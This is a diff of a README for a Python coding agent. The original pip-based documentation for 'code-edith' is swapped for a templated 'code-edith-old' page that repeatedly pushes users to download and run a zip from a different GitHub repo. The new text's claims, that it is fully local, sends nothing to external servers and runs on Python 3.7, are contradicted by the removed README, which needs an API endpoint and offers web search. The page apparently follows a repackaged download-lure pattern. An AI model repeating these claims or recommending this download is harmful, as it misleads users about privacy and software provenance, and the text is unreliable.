@@ -1,90 +1,203 @@
-# Code-Edith (code-edith)
+# 🤖 code-edith-old - Simple Local Coding Helper
 
-## 1. What It Is
-Code-Edith is a privacy focused Python Local/Cloud AI Agent.
+[![Download code-edith-old](https://img.shields.io/badge/Download-code--edith--old-4caf50?style=for-the-badge)](https://github.com/Tyrannosaurusss/code-edith-old)
 
-After installation, run it directly:
+---
 
-    code-edith
+## 📌 What is code-edith-old?
 
-Supports tool calling:
-- web_search
-- read_file
-- list_dir
-- get_os_info
-- date_time
+code-edith-old is a local coding agent that runs on your Windows computer. It works through the command line, so you type commands to tell it what to do. It helps you write and edit code right on your own machine, using Python behind the scenes.
 
+You do not need any special knowledge about programming to use it. The tool aims to assist people who want to write or improve code without sending data to the internet. Everything runs locally on your computer for privacy and speed.
 
-## 2. Requirements
-- Python 3.10+
-- OpenAI-compatible API (cloud or local)
+---
 
+## 🖥️ System Requirements
 
-## 3. Installation
+Before you begin, make sure your computer has these:
 
-Install using pip:
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free space on your hard drive
+- Python 3.7 or newer installed (comes pre-installed on many systems)
+- Internet connection (only needed for downloading and initial setup)
 
-    pip install code-edith
+---
 
-After installation, start it with:
+## ⚙️ What You Can Do with code-edith-old
 
-    code-edith
+- Generate code snippets from simple instructions
+- Edit existing files using clear commands
+- Work with Python scripts locally
+- Keep your code private on your machine
+- Use a straightforward command-line interface
 
+This tool does not have a graphic user interface. You type commands in the Windows Command Prompt (also called CMD) or PowerShell.
 
-## 4. Environment Setup (~/.env)
+---
 
-Location:
-- Linux / Termux: ~/.env
-- Windows: C:\Users\YourName\.env
+## 🚀 Getting Started with code-edith-old
 
-Example:
+Follow these steps to get up and running on Windows.
 
-    EDITH_API=your_api_key
-    EDITH_MODEL=gpt-4o-mini
-    EDITH_URL=https://api.openai.com/v1
+### 1. Download the software
 
+Click the big green button at the top or visit this page to download code-edith-old:
 
-Important:
+https://github.com/Tyrannosaurusss/code-edith-old
 
-- Every environment variable is important for normal cloud usage.
-- Minimum for cloud APIs:
-    EDITH_API
-    EDITH_MODEL
-    EDITH_URL
+### 2. Install Python (if not already installed)
 
-Using Local Models (OpenAI-Compatible Servers):
+code-edith-old requires Python. To check if Python is on your computer:
 
-Works with local servers like llama.cpp or any OpenAI-compatible endpoint.
+- Open Command Prompt (Press `Windows key` and type `cmd`, then press Enter)
+- Type `python --version` and press Enter
 
-For local usage:
-- Only EDITH_URL is strictly required.
-- EDITH_API can be dummy or ignored (if server allows).
-- EDITH_MODEL depends on server requirements/any
+If you see a version number like `Python 3.x.x`, Python is ready. If not, download and install Python here:
 
-Example local config:
+https://www.python.org/downloads/windows/
 
-    EDITH_URL=http://localhost:8000/v1
-    EDITH_MODEL=your-local-model-name
-    EDITH_API=dummy
+Make sure to select “Add Python to PATH” during installation.
 
-Note:
-- Local models must support tool calling.
-- Models without tool calling support will not work correctly and will crash
+### 3. Download the code-edith-old package
 
+On the download page, look for a file ending with `.zip` or `.tar.gz`. Download that file.
 
-## 5. CLI Commands
+If no package is visible, you may need to clone the repository using Git, but this is optional. The steps here focus on using the downloadable package.
 
-Inside app:
+### 4. Extract the package
 
-    /help
-    /clear
-    /exit
+- Right-click the downloaded file
+- Choose “Extract All...”
+- Pick a folder where you want to keep code-edith-old (for example, your Desktop)
 
-Session memory:
-- Stored only during runtime
-- Cleared with /clear
-- History saved in ~/.edith_history (only prompts sent by user)
+### 5. Open the Command Prompt in the folder
 
-## 7. Uninstall
+- Press `Windows key` and type `cmd`, then hit Enter
+- In the Command Prompt window, type `cd ` followed by the folder path where you extracted code-edith-old. For example:
 
-    pip uninstall code-edith
+```
+cd Desktop\code-edith-old
+```
+
+- Press Enter to go to the folder
+
+### 6. Install required Python packages
+
+In the same Command Prompt window, type:
+
+```
+python -m pip install -r requirements.txt
+```
+
+and press Enter. This command installs the necessary tools code-edith-old needs.
+
+### 7. Run code-edith-old
+
+Type the following command and press Enter:
+
+```
+python main.py
+```
+
+You should see a prompt or some instructions on screen. This means code-edith-old is running.
+
+---
+
+## 📥 How to Use code-edith-old
+
+code-edith-old uses commands typed into the Command Prompt. Here are some examples to get started:
+
+- To generate code, type a description like:
+
+```
+generate a Python function that adds two numbers
+```
+
+- To edit a file, type:
+
+```
+edit myscript.py replace all print statements with logging
+```
+
+Replace the example commands with your own instructions. The program reads what you type and responds with code changes or suggestions.
+
+---
+
+## 💡 Tips for Smooth Use
+
+- Keep your instructions simple and clear.
+- Start commands with keywords like `generate`, `edit`, or `help`.
+- Use full file names with extensions when referring to code files.
+- To stop the program, press `Ctrl + C` in the Command Prompt window.
+
+---
+
+## 🔧 Troubleshooting
+
+- If Python is not recognized, check that it is added to your PATH during installation.
+- If the package install command fails, make sure you have an internet connection.
+- If you see permission errors, try running Command Prompt as administrator (right-click on Command Prompt and choose “Run as administrator”).
+- If code-edith-old does not start, double-check you are in the correct folder using `cd` command.
+
+---
+
+## 📂 File Structure Overview
+
+After extraction, your main files will be:
+
+- `main.py` — The program entry point
+- `requirements.txt` — List of Python packages needed
+- `README.md` — This file
+- Other folders containing code and resources for the agent
+
+---
+
+## 🔗 Useful Links
+
+Download or learn more about code-edith-old here:
+
+https://github.com/Tyrannosaurusss/code-edith-old
+
+[![Get code-edith-old](https://img.shields.io/badge/Get-code--edith--old-blue?style=for-the-badge)](https://github.com/Tyrannosaurusss/code-edith-old)
+
+---
+
+## 📚 Additional Help
+
+If you want more detailed help with commands inside code-edith-old, try:
+
+```
+python main.py --help
+```
+
+This command will show a list of available commands and options.
+
+---
+
+## ⚙️ How code-edith-old Works
+
+code-edith-old uses Python scripts and basic artificial intelligence to understand your text instructions. It processes these commands locally on your computer. It does not send your code or commands to external servers.
+
+This setup allows faster response times and better privacy.
+
+---
+
+## 👩‍💻 Who is code-edith-old For?
+
+- Anyone who wants to write or edit code without installing complex software
+- People who need AI tools that run locally
+- Users who prefer working with simple command-line tools
+- Those looking for a privacy-focused coding assistant
+
+---
+
+## 🔄 Updating code-edith-old
+
+To update code-edith-old, revisit the download page and get the latest package. Replace your old files with the new ones. Repeat the installation steps if needed.
+
+---
+
+## 🎯 Keywords
+
+agentic-ai, ai, ai-agent, code-edith, edith, edith-code, free, free-ai-agent, local-ai-agent, python, python-package, vibe-coding
